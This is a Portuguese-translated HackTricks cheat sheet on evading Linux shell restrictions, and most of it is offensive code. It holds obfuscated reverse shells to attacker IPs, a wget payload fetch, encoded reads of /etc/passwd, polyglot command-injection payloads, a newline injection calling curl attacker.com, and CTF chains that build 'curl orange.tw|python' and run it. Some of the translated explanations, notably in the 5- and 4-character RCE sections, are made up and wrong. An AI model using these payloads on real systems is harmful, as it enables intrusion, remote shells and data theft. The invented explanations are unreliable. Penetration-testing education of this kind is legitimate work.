# Bypassando Restrições no Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bypass de Limitações Comuns

### Shell Reverso
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell reverso curto

Um shell reverso curto é uma técnica de hacking que permite a um invasor obter acesso a um sistema remoto e executar comandos nele. O invasor cria um shell reverso no sistema alvo, que se conecta de volta ao invasor, permitindo assim o controle remoto do sistema. Isso pode ser usado para explorar vulnerabilidades e obter acesso não autorizado a sistemas. É importante ressaltar que o uso de um shell reverso para fins maliciosos é ilegal e pode resultar em consequências legais graves.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Bypassar Caminhos e palavras proibidas

Existem várias técnicas que podem ser usadas para contornar restrições de caminhos e palavras proibidas no Bash. Aqui estão algumas delas:

1. **Usar caminhos absolutos**: Em vez de usar caminhos relativos, você pode usar caminhos absolutos para acessar arquivos ou executáveis ​​que estão restritos. Por exemplo, em vez de digitar `./arquivo_restrito`, você pode digitar `/caminho_completo/arquivo_restrito`.

2. **Usar caracteres de escape**: Se uma palavra está proibida, você pode usar caracteres de escape para contornar a restrição. Por exemplo, se a palavra proibida é `proibido`, você pode digitar `pro\ibido` para evitar a detecção.

3. **Renomear arquivos ou executáveis**: Se um arquivo ou executável está restrito, você pode renomeá-lo para evitar a detecção. Por exemplo, se o arquivo restrito é chamado de `restrito.sh`, você pode renomeá-lo para `permitido.sh` e executá-lo sem problemas.

4. **Usar aliases**: Você pode criar aliases para comandos ou executáveis ​​restritos. Por exemplo, se o comando `ls` está restrito, você pode criar um alias chamado `listar` que execute o mesmo comando.

5. **Usar variáveis ​​de ambiente**: Você pode usar variáveis ​​de ambiente para contornar restrições. Por exemplo, se um caminho está restrito, você pode definir uma variável de ambiente com o caminho desejado e usá-la em vez do caminho restrito.

Lembre-se de que essas técnicas devem ser usadas com responsabilidade e apenas para fins legais e autorizados. O uso indevido dessas técnicas pode resultar em consequências legais graves.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypassar espaços proibidos

Em algumas situações, você pode encontrar restrições que impedem o uso de espaços em comandos no Bash. No entanto, existem algumas técnicas que você pode usar para contornar essas restrições.

Uma maneira de contornar essa restrição é usar a barra invertida (\) para escapar o espaço. Por exemplo, em vez de digitar um espaço normalmente, você pode digitar "\ " para representar um espaço.

Outra técnica é usar aspas para envolver o comando que contém espaços. Por exemplo, em vez de digitar um comando como `ls -l /etc/passwd`, você pode digitar `'ls -l /etc/passwd'` ou `"ls -l /etc/passwd"`.

Além disso, você também pode usar a variável de ambiente `$IFS` para contornar as restrições de espaço. O `$IFS` é o separador de campo interno e, por padrão, inclui o espaço como um separador. No entanto, você pode alterar o valor do `$IFS` para um caractere que não seja um espaço, como um ponto-e-vírgula (;), para contornar as restrições de espaço.

Lembre-se de que essas técnicas podem não funcionar em todas as situações, pois dependem das configurações e restrições específicas do sistema. Portanto, é importante entender as limitações e testar cuidadosamente essas técnicas antes de usá-las em um ambiente de produção.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypassar barra invertida e barra

Às vezes, ao tentar executar comandos em um ambiente restrito do Bash, você pode encontrar restrições que impedem o uso de barras invertidas (\) e barras (/). No entanto, existem algumas técnicas que você pode usar para contornar essas restrições.

#### Usando caracteres hexadecimais

Uma maneira de contornar as restrições é usar caracteres hexadecimais para representar as barras invertidas e barras. Por exemplo, em vez de usar a barra invertida (\), você pode usar o código hexadecimal \x5c. Da mesma forma, em vez de usar a barra (/), você pode usar o código hexadecimal \x2f.

```
$ echo -e "ls\x20-l"
```

#### Usando o comando printf

Outra técnica é usar o comando printf para imprimir os caracteres desejados. Por exemplo, você pode usar o seguinte comando para imprimir uma barra invertida (\):

```
$ printf "%s" "\\"
```

Da mesma forma, você pode usar o seguinte comando para imprimir uma barra (/):

```
$ printf "%s" "/"
```

#### Usando o comando echo -e

O comando echo -e também pode ser usado para contornar as restrições. Por exemplo, você pode usar o seguinte comando para imprimir uma barra invertida (\):

```
$ echo -e "\\"
```

Da mesma forma, você pode usar o seguinte comando para imprimir uma barra (/):

```
$ echo -e "/"
```

Essas técnicas podem ser úteis ao tentar contornar restrições de barras invertidas e barras em um ambiente restrito do Bash. No entanto, é importante lembrar que o uso indevido dessas técnicas pode violar políticas de segurança e ser considerado uma atividade ilegal. Portanto, sempre use essas técnicas com responsabilidade e dentro dos limites legais.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Bypassar pipes

Pipes são uma forma comum de redirecionar a saída de um comando para a entrada de outro comando. No entanto, em certos casos, as restrições do shell podem impedir o uso de pipes. Felizmente, existem algumas técnicas que podem ser usadas para contornar essas restrições.

#### Usando process substitution

A substituição de processos é uma técnica que permite que a saída de um comando seja tratada como um arquivo temporário. Isso pode ser útil para contornar restrições de pipes. Para usar a substituição de processos, você pode usar a sintaxe `<(comando)`, onde `comando` é o comando cuja saída você deseja usar como entrada para outro comando.

Por exemplo, se você quiser usar a saída do comando `ls` como entrada para o comando `grep`, mas as restrições do shell não permitem o uso de pipes, você pode contornar isso usando a substituição de processos da seguinte maneira:

```
grep foo <(ls)
```

#### Usando um arquivo temporário

Outra maneira de contornar as restrições de pipes é usar um arquivo temporário para armazenar a saída de um comando e, em seguida, usar esse arquivo como entrada para outro comando. Para fazer isso, você pode usar os comandos `mktemp` e `rm` para criar e excluir o arquivo temporário, respectivamente.

Por exemplo, se você quiser usar a saída do comando `ls` como entrada para o comando `grep`, mas as restrições do shell não permitem o uso de pipes, você pode contornar isso usando um arquivo temporário da seguinte maneira:

```
tmpfile=$(mktemp)
ls > $tmpfile
grep foo $tmpfile
rm $tmpfile
```

Essas são apenas algumas técnicas que podem ser usadas para contornar as restrições de pipes em um shell. É importante lembrar que o uso dessas técnicas pode ser considerado uma violação de políticas de segurança e ética, portanto, deve ser usado com cuidado e apenas para fins legítimos.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypassar com codificação hexadecimal

Às vezes, certas restrições de segurança podem ser aplicadas a comandos Bash para evitar a execução de certas ações. No entanto, é possível contornar essas restrições usando codificação hexadecimal.

A codificação hexadecimal envolve a conversão de caracteres ASCII em sua representação hexadecimal correspondente. Isso permite que você insira caracteres especiais que normalmente seriam bloqueados pelas restrições de segurança.

Aqui está um exemplo de como usar a codificação hexadecimal para contornar as restrições do Bash:

```
$ echo -e "\x63\x61\x74 /etc/passwd"
```

Neste exemplo, o comando `echo` é usado para imprimir a string `\x63\x61\x74 /etc/passwd`. A sequência `\x63\x61\x74` representa a codificação hexadecimal para a palavra "cat". Portanto, o comando acima é equivalente a executar `cat /etc/passwd`.

Ao usar a codificação hexadecimal, você pode contornar as restrições do Bash e executar comandos que normalmente seriam bloqueados. No entanto, tenha cuidado ao usar essa técnica, pois ela pode ser considerada uma violação de segurança e pode ter consequências indesejadas.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypassar IPs

Existem várias técnicas para contornar restrições de IP em um sistema Linux. Aqui estão algumas delas:

- **Usar um proxy**: Configurar um proxy pode permitir que você acesse recursos bloqueados por restrições de IP. Existem várias opções de proxy disponíveis, como Squid, Nginx e HAProxy.

- **Usar uma VPN**: Uma VPN (Rede Virtual Privada) pode mascarar seu endereço IP real e fornecer um endereço IP diferente para contornar as restrições de IP. Existem muitos provedores de VPN disponíveis, como NordVPN, ExpressVPN e CyberGhost.

- **Usar a rede Tor**: A rede Tor é uma rede anônima que pode ajudar a contornar restrições de IP. Ao usar o Tor, seu tráfego é roteado através de uma série de nós, tornando difícil rastrear sua localização real. Você pode usar o navegador Tor ou configurar um proxy Tor.

- **Usar um servidor proxy reverso**: Configurar um servidor proxy reverso pode permitir que você acesse recursos bloqueados por restrições de IP. Um servidor proxy reverso atua como intermediário entre você e o recurso desejado, mascarando seu endereço IP real.

- **Usar um serviço de tradução de IP**: Alguns serviços de tradução de IP, como o IPv6-to-IPv4 Network Address Translator (NAT64), podem ajudar a contornar restrições de IP. Esses serviços traduzem seu endereço IP para um formato diferente, permitindo que você acesse recursos bloqueados.

Lembre-se de que contornar restrições de IP pode ser ilegal ou violar os termos de serviço de um sistema ou aplicativo. Certifique-se de entender as leis e regulamentos locais antes de usar essas técnicas.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltração de dados baseada em tempo

A exfiltração de dados baseada em tempo é uma técnica utilizada para transferir dados de um sistema comprometido para um local externo, aproveitando atrasos de tempo. Essa técnica é útil quando outras formas de exfiltração de dados, como transferências de arquivos convencionais, são bloqueadas ou monitoradas.

Existem várias maneiras de realizar a exfiltração de dados baseada em tempo, incluindo:

- Atrasos de tempo em comandos: Ao inserir atrasos de tempo em comandos executados no sistema comprometido, é possível transmitir dados através da variação do tempo de resposta. Por exemplo, um script pode ser configurado para enviar um caractere por vez, com um atraso de tempo entre cada caractere.

- Uso de serviços de terceiros: Alguns serviços de terceiros, como serviços de armazenamento em nuvem ou plataformas de compartilhamento de arquivos, podem ser explorados para exfiltrar dados. Ao usar esses serviços, é possível enviar dados em pequenos pedaços, com atrasos de tempo entre cada envio.

- Uso de canais encobertos: Canais encobertos são técnicas que permitem a transferência de dados através de protocolos ou serviços aparentemente inofensivos. Por exemplo, é possível usar o protocolo DNS para enviar dados, aproveitando os atrasos de tempo entre as solicitações e respostas.

É importante ressaltar que a exfiltração de dados baseada em tempo pode ser mais lenta em comparação com outras técnicas de exfiltração de dados. No entanto, essa técnica pode ser eficaz quando outras opções estão indisponíveis ou bloqueadas.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obtendo caracteres de Variáveis de Ambiente

Em certos cenários de hacking, pode ser útil obter caracteres de variáveis de ambiente no sistema Linux. Isso pode ser feito usando o comando `echo` e a sintaxe `${VAR_NAME:OFFSET:LENGTH}` para extrair os caracteres desejados.

Por exemplo, se quisermos obter os primeiros 5 caracteres da variável de ambiente `SECRET_KEY`, podemos usar o seguinte comando:

```bash
echo ${SECRET_KEY:0:5}
```

Isso retornará os primeiros 5 caracteres da variável `SECRET_KEY`. Você pode ajustar o valor do `OFFSET` e `LENGTH` conforme necessário para obter diferentes partes da variável de ambiente.

Lembre-se de que, ao usar esse método, você precisa ter permissões adequadas para acessar as variáveis de ambiente no sistema.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltração de dados DNS

Você pode usar **burpcollab** ou [**pingb**](http://pingb.in), por exemplo.

### Comandos internos

Caso você não consiga executar funções externas e tenha acesso apenas a um **conjunto limitado de comandos internos para obter RCE**, existem alguns truques úteis para fazer isso. Geralmente, você **não poderá usar todos** os **comandos internos**, então você deve **conhecer todas as suas opções** para tentar burlar a restrição. Ideia do [**devploit**](https://twitter.com/devploit).\
Primeiro, verifique todos os [**comandos internos do shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Em seguida, aqui estão algumas **recomendações**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Injeção de comando poliglota

Polyglot command injection is a technique used to bypass restrictions in Bash commands. It involves injecting malicious code that can be interpreted by multiple programming languages, allowing an attacker to execute arbitrary commands on a target system.

To perform a polyglot command injection, an attacker needs to find a command that is valid in both Bash and another programming language. This can be achieved by using special characters and syntax that are interpreted differently by each language.

For example, consider the following command:

```
$(command)
```

In Bash, this syntax is used to execute a command and substitute its output. However, in some programming languages like PHP, this syntax is used to execute a command directly.

By using this command injection technique, an attacker can bypass restrictions that prevent the execution of certain commands in Bash. This can be particularly useful in situations where the target system has restricted access or limited functionality.

To protect against polyglot command injection attacks, it is important to sanitize user input and validate any commands that are executed on the system. Additionally, keeping software and systems up to date with the latest security patches can help mitigate the risk of such attacks.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypassar possíveis regexes

Às vezes, ao realizar testes de penetração, você pode encontrar restrições de entrada que usam expressões regulares (regexes) para validar os dados. No entanto, existem algumas técnicas que você pode usar para contornar essas restrições e enviar dados que normalmente seriam bloqueados.

Uma técnica comum é usar caracteres especiais que são interpretados de maneira diferente pelas regexes. Por exemplo, você pode usar o caractere de escape `\` para evitar que um caractere seja interpretado como parte de uma regex. Outra opção é usar conjuntos de caracteres para representar um determinado intervalo de valores.

Além disso, você pode tentar explorar falhas nas implementações de regexes para contornar as restrições. Por exemplo, algumas implementações podem ter vulnerabilidades que permitem a execução de código arbitrário.

Lembre-se de que a intenção aqui é apenas para fins educacionais e de teste de penetração autorizado. O uso indevido dessas técnicas pode ser ilegal e sujeito a penalidades legais.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

O Bashfuscator é uma ferramenta poderosa usada para ofuscar scripts Bash, tornando-os mais difíceis de serem detectados e analisados. Ele usa várias técnicas de ofuscação para modificar o código-fonte do script, tornando-o menos legível para os olhos humanos e mais desafiador para análise automatizada.

O Bashfuscator pode ser usado para contornar restrições impostas em ambientes restritos, onde a execução de scripts Bash é limitada ou monitorada. Ao ofuscar o script, é possível evitar a detecção de palavras-chave ou padrões específicos que poderiam acionar alertas de segurança.

Além disso, o Bashfuscator também pode ser usado para proteger a propriedade intelectual de scripts Bash, dificultando a engenharia reversa e a cópia não autorizada.

No entanto, é importante ressaltar que o uso do Bashfuscator para fins maliciosos é ilegal e antiético. Esta ferramenta deve ser usada apenas para fins legítimos, como testes de segurança ou proteção de scripts proprietários.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE com 5 caracteres

Uma técnica comum para explorar vulnerabilidades de execução remota de código (RCE) é a utilização de comandos de shell para executar código arbitrário no sistema alvo. No entanto, em alguns casos, o uso de certos caracteres especiais pode ser restrito, dificultando a execução de comandos maliciosos.

Neste cenário, vamos explorar uma técnica que permite contornar restrições de caracteres e executar comandos RCE com apenas 5 caracteres. Essa técnica é conhecida como "RCE com 5 caracteres".

#### Pré-requisitos

Antes de prosseguir, é importante ter acesso a um shell interativo no sistema alvo. Isso pode ser obtido através de uma vulnerabilidade de injeção de comandos ou de alguma outra falha de segurança.

#### Passo a passo

1. Abra um shell interativo no sistema alvo.

2. Utilize o seguinte comando para executar o código desejado:

```bash
${IFS:0:1}e${IFS:0:1}x${IFS:0:1}p${IFS:0:1}r${IFS:0:1}e${IFS:0:1}s${IFS:0:1}s${IFS:0:1}i${IFS:0:1}o${IFS:0:1}n${IFS:0:1} ${IFS:0:1}-${IFS:0:1}e${IFS:0:1} ${IFS:0:1}<comando>
```

Substitua `<comando>` pelo código que deseja executar. Certifique-se de que o comando esteja entre aspas, caso contenha espaços ou caracteres especiais.

#### Explicação

Nessa técnica, utilizamos o parâmetro `${IFS:0:1}` para representar um espaço em branco. O `${IFS}` é uma variável de ambiente que define os caracteres usados como separadores de campo. Ao definir `${IFS:0:1}` como espaço em branco, podemos contornar as restrições de caracteres especiais e executar comandos arbitrários.

O comando `echo` é utilizado para exibir o código que desejamos executar. Em seguida, o comando `eval` é usado para executar o código exibido pelo `echo`. Dessa forma, conseguimos contornar as restrições de caracteres e executar comandos RCE com apenas 5 caracteres.

#### Considerações finais

A técnica de "RCE com 5 caracteres" é uma forma criativa de contornar restrições de caracteres especiais e executar comandos maliciosos em sistemas alvo. No entanto, é importante lembrar que a exploração de vulnerabilidades e a execução de comandos em sistemas sem autorização é ilegal e antiética. Essas informações são fornecidas apenas para fins educacionais e de conscientização sobre segurança cibernética.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE com 4 caracteres

Neste capítulo, vamos explorar uma técnica de execução remota de código (RCE) usando apenas 4 caracteres. Essa técnica é extremamente útil quando você está lidando com restrições de shell, como quando o acesso ao shell é limitado ou quando certos caracteres são bloqueados.

A ideia por trás dessa técnica é usar um comando do Linux que tenha apenas 4 caracteres para executar um código arbitrário. Aqui estão alguns comandos úteis que podem ser usados:

1. `echo`: O comando `echo` é usado para imprimir uma linha de texto na saída padrão. No entanto, também pode ser usado para executar comandos. Por exemplo, você pode usar o comando `echo` para executar um comando como `ls` da seguinte maneira: `echo ls`.

2. `eval`: O comando `eval` é usado para avaliar uma string como um comando. Isso significa que você pode usar o comando `eval` para executar qualquer comando que desejar. Por exemplo, você pode usar o comando `eval` para executar um comando como `ls` da seguinte maneira: `eval ls`.

3. `$_`: A variável especial `$_` contém o último argumento do comando anterior. Isso significa que você pode usar a variável `$_` para executar o último comando novamente. Por exemplo, se você executar o comando `ls`, poderá executá-lo novamente usando `$_`.

4. `!!`: O comando `!!` é usado para executar o último comando novamente. Isso significa que você pode usar o comando `!!` para executar o último comando novamente. Por exemplo, se você executar o comando `ls`, poderá executá-lo novamente usando `!!`.

Esses comandos podem ser usados de várias maneiras para executar código arbitrário e contornar restrições de shell. No entanto, é importante lembrar que o uso indevido dessas técnicas pode ser ilegal e antiético. Portanto, sempre use essas técnicas com responsabilidade e apenas em sistemas nos quais você tenha permissão para fazer isso.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypassando Restrições do Bash

Se você estiver dentro de um sistema de arquivos com as proteções de **somente leitura e noexec** ou até mesmo em um contêiner distroless, ainda existem maneiras de **executar binários arbitrários, até mesmo um shell!**:

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Bypass de Chroot e Outras Jails

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Referências e Mais

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias mais avançadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
